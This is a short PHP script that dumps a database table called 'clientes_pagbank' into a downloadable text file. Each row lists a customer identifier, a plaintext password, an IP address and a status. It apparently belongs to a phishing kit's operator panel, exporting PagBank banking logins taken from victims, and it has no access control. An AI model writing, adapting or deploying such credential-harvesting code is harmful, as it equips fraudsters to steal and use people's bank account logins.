<?php
$DATABASE_URL = getenv("DATABASE_URL");
$db = pg_connect($DATABASE_URL);

if (isset($_GET['id'])) {
  $id = $_GET['id'];
  $res = pg_query_params($db, "SELECT * FROM clientes_pagbank WHERE cliente_id = $1", [$id]);
} else {
  $res = pg_query($db, "SELECT * FROM clientes_pagbank ORDER BY created_at DESC");
}

$linhas = [];
while ($row = pg_fetch_assoc($res)) {
  $linhas[] = "ID: {$row['cliente_id']}\nIdentificador: {$row['identificador']}\nSenha: {$row['senha']}\nIP: {$row['ip']}\nStatus: {$row['status']}\nData: {$row['created_at']}\n\n";
}

header('Content-Type: text/plain');
header('Content-Disposition: attachment; filename="dados_pagbank.txt"');
echo implode("\n", $linhas);
exit;
